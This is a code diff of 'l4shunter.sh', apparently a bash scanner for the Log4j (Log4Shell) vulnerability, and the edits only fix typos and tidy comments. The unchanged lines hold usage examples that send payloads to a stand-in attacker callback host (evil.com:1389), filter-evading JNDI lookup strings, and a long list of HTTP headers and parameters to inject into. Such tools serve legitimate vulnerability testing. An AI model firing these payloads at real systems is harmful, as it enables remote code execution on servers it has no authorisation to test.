@@ -27,7 +27,7 @@ print_usage() {
 	echo -e "${O}./l4shunter.sh -c localhost:1389 -T localhost:8081 -j \\\${lower:j}n\\\${lower:d}i -p r\\\${::-m}\\\${::-i} -P Exploit -U urlsFile.txt -H ALL -e \"-H Cookie: JSESSIONID=secret\" ${STOP}";
 	echo -e "One target with log4j 2.15 (CVE-2021-45046), testing 2 headers and one GET parameter, showing headers of request and response";
 	echo -e "${O}./l4shunter.sh -c 127.0.0.1#evil.com:1389 -T localhost:8089/get -P Exploit -H X-Api-Version,Referer -G getParam -e \"-i -v\" ${STOP}";
-	echo -e "Showing only requests and final payload (hinding everything from curl)";
+	echo -e "Showing only requests and final payload (hiding everything from curl)";
 	echo -e "${O}./l4shunter.sh -c evil.com:1389 -T localhost:8089/get -P Exploit -H X-Api-Version,Referer -e \"-s -o /dev/null\" ${STOP}";
 	exit;
 }
@@ -46,18 +46,18 @@ function cleanup {
 }
 
 setDefaultValues() {
-	rawTargets=''; #
-	callbackHost='' # the server that will log if it's a success, or the LDAP server that will redirect the request to your http server that will deliver the jndi
-	rawProtocols='${::-r}m${::-i}'; # exploitable protocols eg ldap,ldaps,rmi,dns,iiop,http
+	rawTargets='';
+	callbackHost=''
+	rawProtocols='${::-r}m${::-i}'; # eg ldap,ldaps,rmi,dns,iiop,http
 	rawGetParams='';
 	rawPostParams='username,user,email,email_address,password';
-	rawHeaders=''; # by default, we don't use test any headers
+	rawHeaders=''; # by default, we don't test any headers
 	allHeaders='Referer,X-Api-Version,Accept-Charset,Accept-Datetime,Accept-Encoding,Accept-Language,Cookie,Forwarded,Forwarded-For,Forwarded-For-Ip,Forwarded-Proto,From,TE,True-Client-IP,Upgrade,User-Agent,Via,Warning,X-Api-Version,Max-Forwards,Origin,Pragma,DNT,Cache-Control,X-Att-Deviceid,X-ATT-DeviceId,X-Correlation-ID,X-Csrf-Token,X-CSRFToken,X-Do-Not-Track,X-Foo,X-Foo-Bar,X-Forwarded,X-Forwarded-By,X-Forwarded-For,X-Forwarded-For-Original,X-Forwarded-Host,X-Forwarded-Port,X-Forwarded-Proto,X-Forwarded-Protocol,X-Forwarded-Scheme,X-Forwarded-Server,X-Forwarded-Ssl,X-Forwarder-For,X-Forward-For,X-Forward-Proto,X-Frame-Options,X-From,X-Geoip-Country,X-Http-Destinationurl,X-Http-Host-Override,X-Http-Method,X-Http-Method-Override,X-HTTP-Method-Override,X-Http-Path-Override,X-Https,X-Htx-Agent,X-Hub-Signature,X-If-Unmodified-Since,X-Imbo-Test-Config,X-Insight,X-Ip,X-Ip-Trail,X-ProxyUser-Ip,X-Requested-With,X-Request-ID,X-UIDH,X-Wap-Profile,X-XSRF-TOKEN' # if -H ALL is passed, all those headers will be tested simultaneously
 	rawMethods='GET,POST,POSTJSON';
-	rawExtraParams='' #
-	urlsFile='' #
-	payload='' #
-	timeout='3'; # 
+	rawExtraParams=''
+	urlsFile=''
+	payload=''
+	timeout='3';
 	jndi='${::-j}n${::-d}${::-i}';
 	noBanner="false" # print hack3r banner by default for consistency
 }
@@ -158,7 +158,7 @@ setSharedVariables() {
 		readarray -t urls < "$urlsFile" 2>/dev/null;
 	fi
 
-	# Add backslash to parentheses for our friend curl
+	# Add backslash to curly brackets for our friend curl
 	callbackHost=$(echo "$callbackHost" | sed 's/[{]/\\{/g' | sed 's/[}]/\\}/g');
 	jndiGet=$(echo "$jndi" | sed 's/[{]/\\{/g' | sed 's/[}]/\\}/g');
 }
@@ -166,7 +166,6 @@ setSharedVariables() {
 
 # https://stackoverflow.com/questions/23564995/how-to-modify-a-global-variable-within-a-function-in-bash
 processGetParams() {
-
 	protocolGet=$(echo "$pr" | sed 's/[{]/\\{/g' | sed 's/[}]/\\}/g');
 	for(( i=0; i<${#getParams[@]}; i++ )); do 
 		if [[ "$i" -eq "0" ]] && [[ "$target" != *"?"* ]]; then
@@ -209,11 +208,6 @@ createPostJsonFile() {
 	done
 	echo '}' >> "$tmpJsonFile"
 }
-
-
-
-
-
 
 
 
